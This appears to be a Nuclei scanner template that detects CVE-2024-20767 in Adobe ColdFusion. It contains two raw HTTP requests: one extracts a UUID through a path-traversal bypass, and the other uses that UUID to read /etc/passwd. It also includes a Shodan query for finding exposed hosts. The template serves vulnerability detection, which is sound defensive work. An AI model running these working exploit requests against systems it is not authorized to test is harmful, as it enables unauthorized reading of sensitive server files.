http:
- extractors:
  - group: 1
    internal: true
    name: extracted_uuid
    part: body_1
    regex:
    - <var name='uuid'><string>(.*)</string>
    type: regex
  matchers:
  - condition: and
    dsl:
    - contains(body_1, 'wddxPacket')
    - contains(header_2, 'application/json')
    - contains(body_2, '/bin/bash')
    type: dsl
  matchers-condition: and
  raw:
  - 'GET /hax/..CFIDE/adminapi/_servermanager/servermanager.cfc?method=getHeartBeat
    HTTP/1.1

    Host: {{Hostname}}

    '
  - 'GET /hax/../pms?module=logging&file_name=../../../../../../../../../../../../../../../../../../etc/passwd&number_of_lines=1000
    HTTP/1.1

    Host: {{Hostname}}

    uuid: {{extracted_uuid}}

    '
id: CVE-2024-20767
info:
  author: iamnoooob,rootxharsh,pdresearch
  classification:
    cve-id: CVE-2024-20767
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N
    cvss-score: 8.2
    cwe-id: CWE-284
    epss-percentile: 0.35684
    epss-score: 0.00087
  description: 'ColdFusion versions 2023.6, 2021.12 and earlier are affected by an
    Improper Access Control vulnerability that could lead to arbitrary file system
    read. An attacker could leverage this vulnerability to bypass security measures
    and gain unauthorized access to sensitive files and perform arbitrary file system
    write. Exploitation of this issue does not require user interaction.

    '
  metadata:
    max-request: 2
    shodan-query: http.component:"Adobe ColdFusion"
    verified: true
  name: Adobe ColdFusion - Arbitrary File Read
  reference:
  - https://jeva.cc/2973.html
  - https://nvd.nist.gov/vuln/detail/CVE-2024-20767
  - https://helpx.adobe.com/security/products/coldfusion/apsb24-14.html
  severity: high
  tags: cve,cve2024,adobe,condfusion,lfr
